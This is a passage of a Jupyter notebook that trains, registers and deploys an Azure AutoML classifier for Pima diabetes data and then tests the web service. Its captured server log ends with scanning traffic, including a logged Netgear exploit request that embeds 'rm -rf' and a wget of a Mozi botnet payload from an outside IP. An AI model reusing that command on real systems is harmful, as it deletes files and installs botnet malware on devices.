            "        16   MaxAbsScaler ExtremeRandomTrees                0:02:01       0.8033    0.8366\n",
            "        17   MaxAbsScaler ExtremeRandomTrees                0:02:13       0.8069    0.8366\n",
            "        18   MaxAbsScaler RandomForest                      0:02:04       0.8012    0.8366\n",
            "        19   StandardScalerWrapper XGBoostClassifier        0:02:13       0.8240    0.8366\n",
            "        20   SparseNormalizer XGBoostClassifier             0:02:01       0.7492    0.8366\n",
            "        21   StandardScalerWrapper XGBoostClassifier        0:02:05       0.8298    0.8366\n",
            "        22   MaxAbsScaler LightGBM                          0:02:05       0.8152    0.8366\n",
            "        23   MaxAbsScaler LightGBM                          0:02:01       0.8315    0.8366\n",
            "        24   MaxAbsScaler LightGBM                          0:02:03       0.8366    0.8366\n",
            "        25   StandardScalerWrapper XGBoostClassifier        0:01:59       0.8124    0.8366\n",
            "        26   MaxAbsScaler LightGBM                          0:02:05       0.8349    0.8366\n",
            "        27   StandardScalerWrapper XGBoostClassifier        0:02:04       0.7868    0.8366\n",
            "        28   StandardScalerWrapper XGBoostClassifier        0:02:04       0.8133    0.8366\n",
            "        29   StandardScalerWrapper GradientBoosting         0:02:13       0.8355    0.8366\n",
            "        30   StandardScalerWrapper XGBoostClassifier        0:02:04       0.8196    0.8366\n",
            "        31   StandardScalerWrapper GradientBoosting         0:02:16       0.8307    0.8366\n",
            "        32   MaxAbsScaler SGD                               0:02:05       0.8090    0.8366\n",
            "        33   MaxAbsScaler LogisticRegression                0:02:05       0.8218    0.8366\n",
            "        34   MaxAbsScaler LogisticRegression                0:02:04       0.8209    0.8366\n",
            "        35   StandardScalerWrapper XGBoostClassifier        0:02:01       0.8127    0.8366\n",
            "        36                                                  0:00:31          nan    0.8366\n",
            "        37    VotingEnsemble                                0:03:28       0.8445    0.8445\n"
          ]
        },
        {
          "output_type": "execute_result",
          "execution_count": 7,
          "data": {
            "text/plain": "[('1',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('xgboostclassifier',\n                   XGBoostClassifier(base_score=0.5, booster='gbtree',\n                                     colsample_bylevel=1, colsample_bynode=1,\n                                     colsample_bytree=1, gamma=0,\n                                     learning_rate=0.1, max_delta_step=0,\n                                     max_depth=3, min_child_weight=1, missing=nan,\n                                     n_estimators=100, n_jobs=1, nthread=None,\n                                     objective='binary:logistic', random_state=0,\n                                     reg_alpha=0, reg_lambda=1,\n                                     scale_pos_weight=1, seed=None, silent=None,\n                                     subsample=1, tree_method='auto', verbose=-10,\n                                     verbosity=0))],\n           verbose=False)),\n ('24',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('lightgbmclassifier',\n                   LightGBMClassifier(boosting_type='gbdt', class_weight=None,\n                                      colsample_bytree=0.2977777777777778,\n                                      importance_type='split',\n                                      learning_rate=0.0842121052631579,\n                                      max_bin=50, max_depth=-1,\n                                      min_child_samples=3, min_child_weight=8,\n                                      min_split_gain=0.8421052631578947,\n                                      n_estimators=400, n_jobs=1, num_leaves=65,\n                                      objective=None, random_state=None,\n                                      reg_alpha=0.7894736842105263,\n                                      reg_lambda=0.7368421052631579, silent=True,\n                                      subsample=0.7426315789473684,\n                                      subsample_for_bin=200000, subsample_freq=0,\n                                      verbose=-10))],\n           verbose=False)),\n ('29',\n  Pipeline(memory=None,\n           steps=[('standardscalerwrapper',\n                   <azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f54e6390588>),\n                  ('gradientboostingclassifier',\n                   GradientBoostingClassifier(ccp_alpha=0.0,\n                                              criterion='friedman_mse', init=None,\n                                              learning_rate=0.01, loss='deviance',\n                                              max_depth=9, max_features=0.3,\n                                              max_leaf_nodes=None,\n                                              min_impurity_decrease=0.0,\n                                              min_impurity_split=None,\n                                              min_samples_leaf=0.06157894736842105,\n                                              min_samples_split=0.29105263157894734,\n                                              min_weight_fraction_leaf=0.0,\n                                              n_estimators=600,\n                                              n_iter_no_change=None,\n                                              presort='deprecated',\n                                              random_state=None,\n                                              subsample=0.8105263157894737,\n                                              tol=0.0001, validation_fraction=0.1,\n                                              verbose=0, warm_start=False))],\n           verbose=False)),\n ('26',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('lightgbmclassifier',\n                   LightGBMClassifier(boosting_type='gbdt', class_weight=None,\n                                      colsample_bytree=0.8911111111111111,\n                                      importance_type='split',\n                                      learning_rate=0.08947473684210526,\n                                      max_bin=350, max_depth=7,\n                                      min_child_samples=40, min_child_weight=7,\n                                      min_split_gain=0.9473684210526315,\n                                      n_estimators=400, n_jobs=1, num_leaves=194,\n                                      objective=None, random_state=None,\n                                      reg_alpha=0.10526315789473684,\n                                      reg_lambda=0.5789473684210527, silent=True,\n                                      subsample=0.8415789473684211,\n                                      subsample_for_bin=200000, subsample_freq=0,\n                                      verbose=-10))],\n           verbose=False)),\n ('23',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('lightgbmclassifier',\n                   LightGBMClassifier(boosting_type='gbdt', class_weight=None,\n                                      colsample_bytree=0.8911111111111111,\n                                      importance_type='split',\n                                      learning_rate=0.05263631578947369,\n                                      max_bin=110, max_depth=4,\n                                      min_child_samples=8, min_child_weight=8,\n                                      min_split_gain=0.5263157894736842,\n                                      n_estimators=200, n_jobs=1, num_leaves=215,\n                                      objective=None, random_state=None,\n                                      reg_alpha=0, reg_lambda=0.2631578947368421,\n                                      silent=True, subsample=0.3468421052631579,\n                                      subsample_for_bin=200000, subsample_freq=0,\n                                      verbose=-10))],\n           verbose=False)),\n ('9',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('extratreesclassifier',\n                   ExtraTreesClassifier(bootstrap=True, ccp_alpha=0.0,\n                                        class_weight='balanced', criterion='gini',\n                                        max_depth=None, max_features=0.1,\n                                        max_leaf_nodes=None, max_samples=None,\n                                        min_impurity_decrease=0.0,\n                                        min_impurity_split=None,\n                                        min_samples_leaf=0.01,\n                                        min_samples_split=0.15052631578947367,\n                                        min_weight_fraction_leaf=0.0,\n                                        n_estimators=50, n_jobs=1,\n                                        oob_score=False, random_state=None,\n                                        verbose=0, warm_start=False))],\n           verbose=False)),\n ('33',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('logisticregression',\n                   LogisticRegression(C=75.43120063354607, class_weight=None,\n                                      dual=False, fit_intercept=True,\n                                      intercept_scaling=1, l1_ratio=None,\n                                      max_iter=100, multi_class='multinomial',\n                                      n_jobs=1, penalty='l1', random_state=None,\n                                      solver='saga', tol=0.0001, verbose=0,\n                                      warm_start=False))],\n           verbose=False)),\n ('11',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('randomforestclassifier',\n                   RandomForestClassifier(bootstrap=True, ccp_alpha=0.0,\n                                          class_weight='balanced',\n                                          criterion='gini', max_depth=None,\n                                          max_features=0.2, max_leaf_nodes=None,\n                                          max_samples=None,\n                                          min_impurity_decrease=0.0,\n                                          min_impurity_split=None,\n                                          min_samples_leaf=0.06157894736842105,\n                                          min_samples_split=0.10368421052631578,\n                                          min_weight_fraction_leaf=0.0,\n                                          n_estimators=10, n_jobs=1,\n                                          oob_score=True, random_state=None,\n                                          verbose=0, warm_start=False))],\n           verbose=False)),\n ('32',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('sgdclassifierwrapper',\n                   SGDClassifierWrapper(alpha=0.0001, class_weight=None,\n                                        eta0=1e-06, fit_intercept=True,\n                                        l1_ratio=0.9183673469387754,\n                                        learning_rate='optimal', loss='log',\n                                        max_iter=1000, n_jobs=1,\n                                        penalty='elasticnet',\n                                        power_t=0.7777777777777777,\n                                        random_state=None, tol=0.01))],\n           verbose=False)),\n ('10',\n  Pipeline(memory=None,\n           steps=[('maxabsscaler', MaxAbsScaler(copy=True)),\n                  ('randomforestclassifier',\n                   RandomForestClassifier(bootstrap=True, ccp_alpha=0.0,\n                                          class_weight='balanced',\n                                          criterion='entropy', max_depth=None,\n                                          max_features='sqrt',\n                                          max_leaf_nodes=None, max_samples=None,\n                                          min_impurity_decrease=0.0,\n                                          min_impurity_split=None,\n                                          min_samples_leaf=0.01,\n                                          min_samples_split=0.2442105263157895,\n                                          min_weight_fraction_leaf=0.0,\n                                          n_estimators=10, n_jobs=1,\n                                          oob_score=False, random_state=None,\n                                          verbose=0, warm_start=False))],\n           verbose=False))]"
          },
          "metadata": {}
        }
      ],
      "execution_count": 7,
      "metadata": {
        "gather": {
          "logged": 1612176629207
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Print Best Run\n",
        "\n",
        "print(best_run)\n",
        "\n",
        "print(best_run.properties['score'])"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Run(Experiment: automlpimadiabetes,\n",
            "Id: AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_37,\n",
            "Type: azureml.scriptrun,\n",
            "Status: Completed)\n",
            "0.8445341412720611\n"
          ]
        }
      ],
      "execution_count": 12,
      "metadata": {
        "collapsed": true,
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1612176946041
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# Print Fitted Model\n",
        "\n",
        "print(fitted_model)"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Pipeline(memory=None,\n",
            "         steps=[('datatransformer',\n",
            "                 DataTransformer(enable_dnn=None, enable_feature_sweeping=None,\n",
            "                                 feature_sweeping_config=None,\n",
            "                                 feature_sweeping_timeout=None,\n",
            "                                 featurization_config=None, force_text_dnn=None,\n",
            "                                 is_cross_validation=None,\n",
            "                                 is_onnx_compatible=None, logger=None,\n",
            "                                 observer=None, task=None, working_dir=None)),\n",
            "                ('prefittedsoftvotingclassifier',...\n",
            "                                                                                                    n_estimators=10,\n",
            "                                                                                                    n_jobs=1,\n",
            "                                                                                                    oob_score=False,\n",
            "                                                                                                    random_state=None,\n",
            "                                                                                                    verbose=0,\n",
            "                                                                                                    warm_start=False))],\n",
            "                                                                     verbose=False))],\n",
            "                                               flatten_transform=None,\n",
            "                                               weights=[0.06666666666666667,\n",
            "                                                        0.06666666666666667,\n",
            "                                                        0.06666666666666667,\n",
            "                                                        0.13333333333333333,\n",
            "                                                        0.06666666666666667,\n",
            "                                                        0.06666666666666667,\n",
            "                                                        0.13333333333333333,\n",
            "                                                        0.13333333333333333,\n",
            "                                                        0.13333333333333333,\n",
            "                                                        0.13333333333333333]))],\n",
            "         verbose=False)\n",
            "Y_transformer(['LabelEncoder', LabelEncoder()])\n"
          ]
        }
      ],
      "execution_count": 13,
      "metadata": {
        "collapsed": true,
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1612177210883
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Best Model\n",
        "\n",
        "Get the best model from the automl experiments and display all the properties of the model.\n",
        "\n"
      ],
      "metadata": {}
    },
    {
      "cell_type": "code",
      "source": [
        "import joblib\n",
        "import azureml.train.automl\n",
        "\n",
        "# Get your best run and save the model from that run.\n",
        "\n",
        "#!pip install azureml-train-automl-runtime==1.20.0\n",
        "\n",
        "#!pip install azureml-sklearn\n",
        "\n",
        "if \"output\" not in os.listdir():\n",
        "   os.mkdir(\"./output\")   \n",
        "\n",
        "remote_run.get_metrics('AUC_weighted')\n",
        "\n",
        "best_run, fitted_model = remote_run.get_output()\n",
        "print(best_run)\n",
        "print(fitted_model)\n",
        "\n",
        "#best_run = remote_run.get_best_child()\n",
        "best_run_metrics = best_run.get_metrics()\n",
        "parameter_values = best_run.get_details()['runDefinition']['arguments']\n",
        "\n",
        "print ('Best run id:',best_run.id)\n",
        "print ('################################')\n",
        "print ('\\n AUC_weighted:',best_run_metrics['AUC_weighted'])\n",
        "print ('################################')\n",
        "print ('\\n Learning rate:', parameter_values)\n",
        "print ('################################')\n",
        "\n",
        "\n",
        "best_run.get_details()\n",
        "best_run.get_tags()\n"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Run(Experiment: automlpimadiabetes,\n",
            "Id: AutoML_893660ca-9749-4bac-ada9-bd3fce0552bf_38,\n",
            "Type: azureml.scriptrun,\n",
            "Status: Completed)\n",
            "Pipeline(memory=None,\n",
            "         steps=[('datatransformer',\n",
            "                 DataTransformer(enable_dnn=None, enable_feature_sweeping=None,\n",
            "                                 feature_sweeping_config=None,\n",
            "                                 feature_sweeping_timeout=None,\n",
            "                                 featurization_config=None, force_text_dnn=None,\n",
            "                                 is_cross_validation=None,\n",
            "                                 is_onnx_compatible=None, logger=None,\n",
            "                                 observer=None, task=None, working_dir=None)),\n",
            "                ('prefittedsoftvotingclassifier',...\n",
            "                                                                                                    n_estimators=25,\n",
            "                                                                                                    n_jobs=1,\n",
            "                                                                                                    oob_score=False,\n",
            "                                                                                                    random_state=None,\n",
            "                                                                                                    verbose=0,\n",
            "                                                                                                    warm_start=False))],\n",
            "                                                                     verbose=False))],\n",
            "                                               flatten_transform=None,\n",
            "                                               weights=[0.21428571428571427,\n",
            "                                                        0.14285714285714285,\n",
            "                                                        0.07142857142857142,\n",
            "                                                        0.14285714285714285,\n",
            "                                                        0.07142857142857142,\n",
            "                                                        0.07142857142857142,\n",
            "                                                        0.07142857142857142,\n",
            "                                                        0.07142857142857142,\n",
            "                                                        0.07142857142857142,\n",
            "                                                        0.07142857142857142]))],\n",
            "         verbose=False)\n",
            "Y_transformer(['LabelEncoder', LabelEncoder()])\n",
            "Best run id: AutoML_893660ca-9749-4bac-ada9-bd3fce0552bf_38\n",
            "################################\n",
            "\n",
            " Accuracy: 0.8465662274115082\n",
            "################################\n",
            "\n",
            " Learning rate: []\n",
            "################################\n"
          ]
        },
        {
          "output_type": "execute_result",
          "execution_count": 7,
          "data": {
            "text/plain": "{'_aml_system_azureml.automlComponent': 'AutoML',\n '_aml_system_ComputeTargetStatus': '{\"AllocationState\":\"steady\",\"PreparingNodeCount\":0,\"RunningNodeCount\":5,\"CurrentNodeCount\":5}',\n 'ensembled_iterations': '[1, 27, 23, 15, 34, 9, 18, 17, 33, 8]',\n 'ensembled_algorithms': \"['XGBoostClassifier', 'GradientBoosting', 'LightGBM', 'ExtremeRandomTrees', 'LightGBM', 'ExtremeRandomTrees', 'RandomForest', 'ExtremeRandomTrees', 'XGBoostClassifier', 'RandomForest']\",\n 'ensemble_weights': '[0.21428571428571427, 0.14285714285714285, 0.07142857142857142, 0.14285714285714285, 0.07142857142857142, 0.07142857142857142, 0.07142857142857142, 0.07142857142857142, 0.07142857142857142, 0.07142857142857142]',\n 'best_individual_pipeline_score': '0.8366210317228242',\n 'best_individual_iteration': '1',\n '_aml_system_automl_is_child_run_end_telemetry_event_logged': 'True',\n 'model_explain_run_id': 'AutoML_893660ca-9749-4bac-ada9-bd3fce0552bf_ModelExplain',\n 'model_explanation': 'True'}"
          },
          "metadata": {}
        }
      ],
      "execution_count": 7,
      "metadata": {
        "gather": {
          "logged": 1611657234883
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "best_run.get_file_names()\n",
        "joblib.dump(parameter_values,filename='./output/Capstone_automl_best.joblib')"
      ],
      "outputs": [
        {
          "output_type": "execute_result",
          "execution_count": 8,
          "data": {
            "text/plain": "['./output/Capstone_automl_best.joblib']"
          },
          "metadata": {}
        }
      ],
      "execution_count": 8,
      "metadata": {
        "gather": {
          "logged": 1611657251126
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Model Deployment\n",
        "\n",
        "Remember you have to deploy only one of the two models you trained.. Perform the steps in the rest of this notebook only if you wish to deploy this model.\n"
      ],
      "metadata": {}
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "model_dep = remote_run.register_model(model_name='automlpimadiabetes',\n",
        "                           tags={'Name': 'Pima Diabetes Best AutoML Model'})#,\n",
        "                           #model_path='outputs/automldiabetesbmodel.pkl')\n",
        "print(model_dep.name, model_dep.id, model_dep.version, sep='\\t')"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "automlpimadiabetes\tautomlpimadiabetes:3\t3\n"
          ]
        }
      ],
      "execution_count": 48,
      "metadata": {
        "gather": {
          "logged": 1611664012368
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Register the WebService"
      ],
      "metadata": {
        "collapsed": true,
        "gather": {
          "logged": 1598431657736
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from azureml.core.webservice import AciWebservice, Webservice\n",
        "from azureml.core.model import Model\n",
        "from azureml.core.environment import Environment\n",
        "from azureml.core.model import InferenceConfig\n",
        "\n",
        "bestmodel, fmodel = remote_run.get_output()\n",
        "bestmodel.download_file('outputs/scoring_file_v_1_0_0.py', 'scoring.py')  \n",
        "#bestmodel.download_file('outputs/conda_env_v_1_0_0.yml', myenv)  \n",
        "\n",
        "#env = Environment.get(ws, \"AzureML-Minimal\").clone('temp')\n",
        "#env = Environment.get(ws, \"AzureML-Minimal\",'myenv')\n",
        "#env = Environment.from_conda_specification(name='automl',file_path='conda_env_v_1_0_0.yml')\n",
        "\n",
        "env = bestmodel.get_environment()\n",
        "\n",
        "for pip_package in [\"scikit-learn\"]:\n",
        "    env.python.conda_dependencies.add_pip_package(pip_package)\n",
        "\n",
        "inference_config = InferenceConfig(entry_script='scoring.py',\n",
        "                                    environment=env)\n",
        "\n",
        "\n",
        "deployment_config = AciWebservice.deploy_configuration(cpu_cores = 1, memory_gb = 1)\n",
        "service = Model.deploy(ws, \"pimadiabetesendpv3\", [model_dep], inference_config, deployment_config)\n",
        "service.wait_for_deployment(show_output = True)\n",
        "print(service.state)\n",
        "\n"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Tips: You can try get_logs(): https://aka.ms/debugimage#dockerlog or local deployment: https://aka.ms/debugimage#debug-locally to debug if deployment takes longer than 10 minutes.\n",
            "Running........................................................................................................................."
          ]
        }
      ],
      "execution_count": 61,
      "metadata": {
        "gather": {
          "logged": 1598432707604
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Test and delete WebService"
      ],
      "metadata": {
        "collapsed": true,
        "gather": {
          "logged": 1598432765711
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import json\n",
        "from azureml.core.authentication import InteractiveLoginAuthentication\n",
        "from azureml.core.webservice import AciWebservice, Webservice\n",
        "\n",
        "\n",
        "service = Webservice(workspace=ws, name='pimadiabetesendpv3')\n",
        "print(service.scoring_uri)\n",
        "scoring_uri = service.scoring_uri\n",
        "#print(service.swagger_uri)\n",
        "\n",
        "# Set the content type\n",
        "headers = {'Content-Type': 'application/json'}\n",
        "# If authentication is enabled, set the authorization header\n",
        "headers['Authorization'] = f'Bearer {key}'\n",
        "\n",
        "# URL for the web service\n",
        "#scoring_uri = '<your web service URI>'\n",
        "# If the service is authenticated, set the key or token\n",
        "#key = '<your key or token>'\n",
        "\n",
        "# Two sets of data to score, so we get two results back\n",
        "data = {\"data\":\n",
        "        [\n",
        "            [\n",
        "                1,\n",
        "                150,\n",
        "                80,\n",
        "                29,\n",
        "                0,\n",
        "                28.1,\n",
        "                0.627,\n",
        "                25,\n",
        "            ],\n",
        "            [\n",
        "               3,\n",
        "                150,\n",
        "                80,\n",
        "                29,\n",
        "                0,\n",
        "                28.1,\n",
        "                0.627,\n",
        "                44,],\n",
        "            [\n",
        "               1,\n",
        "                150,\n",
        "                80,\n",
        "                29,\n",
        "                0,\n",
        "                28.1,\n",
        "                0.627,\n",
        "                21,]\n",
        "        ]\n",
        "        }\n",
        "# Convert to JSON string\n",
        "input_data = json.dumps(data)\n",
        "\n",
        "# Make the request and display the response\n",
        "resp = requests.post(scoring_uri, input_data, headers=headers)\n",
        "print (resp)\n",
        "print(resp.text)"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "http://159a4ac6-4925-4238-bd97-dbe0430d3a97.australiaeast.azurecontainer.io/score\n",
            "<Response [200]>\n",
            "\"{\\\"result\\\": [\\\"tested_negative\\\", \\\"tested_positive\\\", \\\"tested_negative\\\"]}\"\n"
          ]
        }
      ],
      "execution_count": 29,
      "metadata": {
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1612090065832
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Enable Logging and Log Capture"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "service = Webservice(workspace=ws, name='pimadiabetesendpv3')\n",
        "service.update(enable_app_insights=True)\n",
        "\n",
        "logs = service.get_logs()\n",
        "print(logs)"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "2021-01-27T06:52:43,124305994+00:00 - gunicorn/run \n",
            "2021-01-27T06:52:43,128030409+00:00 - rsyslog/run \n",
            "2021-01-27T06:52:43,136000842+00:00 - iot-server/run \n",
            "2021-01-27T06:52:43,144888178+00:00 - nginx/run \n",
            "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libcrypto.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
            "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libcrypto.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
            "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libssl.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
            "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libssl.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
            "/usr/sbin/nginx: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libssl.so.1.0.0: no version information available (required by /usr/sbin/nginx)\n",
            "rsyslogd: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libuuid.so.1: no version information available (required by rsyslogd)\n",
            "EdgeHubConnectionString and IOTEDGE_IOTHUBHOSTNAME are not set. Exiting...\n",
            "2021-01-27T06:52:43,325920916+00:00 - iot-server/finish 1 0\n",
            "2021-01-27T06:52:43,327602023+00:00 - Exit code 1 is normal. Not restarting iot-server.\n",
            "Starting gunicorn 19.9.0\n",
            "Listening at: http://127.0.0.1:31311 (14)\n",
            "Using worker: sync\n",
            "worker timeout is set to 300\n",
            "Booting worker with pid: 41\n",
            "SPARK_HOME not set. Skipping PySpark Initialization.\n",
            "Generating new fontManager, this may take some time...\n",
            "Initializing logger\n",
            "2021-01-27 06:52:44,627 | root | INFO | Starting up app insights client\n",
            "2021-01-27 06:52:44,627 | root | INFO | Starting up request id generator\n",
            "2021-01-27 06:52:44,627 | root | INFO | Starting up app insight hooks\n",
            "2021-01-27 06:52:44,627 | root | INFO | Invoking user's init function\n",
            "2021-01-27 06:52:46,943 | azureml.core | WARNING | Failure while loading azureml_run_type_providers. Failed to load entrypoint automl = azureml.train.automl.run:AutoMLRun._from_run_dto with exception cannot import name 'RunType'.\n",
            "Failure while loading azureml_run_type_providers. Failed to load entrypoint automl = azureml.train.automl.run:AutoMLRun._from_run_dto with exception cannot import name 'RunType'.\n",
            "2021-01-27 06:52:47,134 | root | INFO | Users's init has completed successfully\n",
            "2021-01-27 06:52:47,187 | root | INFO | Skipping middleware: dbg_model_info as it's not enabled.\n",
            "2021-01-27 06:52:47,188 | root | INFO | Skipping middleware: dbg_resource_usage as it's not enabled.\n",
            "2021-01-27 06:52:47,199 | root | INFO | Scoring timeout is found from os.environ: 60000 ms\n",
            "2021-01-27 06:52:49,809 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:52:49 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-27 06:55:35,119 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:55:35 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-27 06:55:36,187 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:55:36 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-27 06:55:50,043 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:55:50 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-27 06:55:50,850 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:55:50 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-27 06:56:25,367 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:56:25 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-27 06:56:25,943 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:56:25 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-27 06:57:45,185 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:57:45 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-27 06:57:46,289 | root | INFO | Validation Request Content-Type\n",
            "2021-01-27 06:57:46,289 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-27 06:57:46,409 | root | INFO | 200\n",
            "127.0.0.1 - - [27/Jan/2021:06:57:46 +0000] \"POST /score HTTP/1.0\" 200 58 \"-\" \"python-requests/2.25.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:07:51:24 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
            "127.0.0.1 - - [27/Jan/2021:09:39:27 +0000] \"GET /setup.cgi?cmd=rm+-rf+%2Ftmp%2F%2A&curpath=%2F&currentsetting.htm=1&next_file=netgear.cfg&sh+netgear=&todo=syscmd&wget+http%3A%2F%2F182.56.30.248%3A47861%2FMozi.m+-O+%2Ftmp%2Fnetgear= HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [27/Jan/2021:10:16:05 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [27/Jan/2021:10:16:06 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [27/Jan/2021:10:16:08 +0000] \"GET /thinkphp/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [27/Jan/2021:10:16:10 +0000] \"GET /html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [27/Jan/2021:10:16:12 +0000] \"GET /public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [27/Jan/2021:10:16:13 +0000] \"GET /TP/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
            "127.0.0.1 - - [27/Jan/2021:10:30:52 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
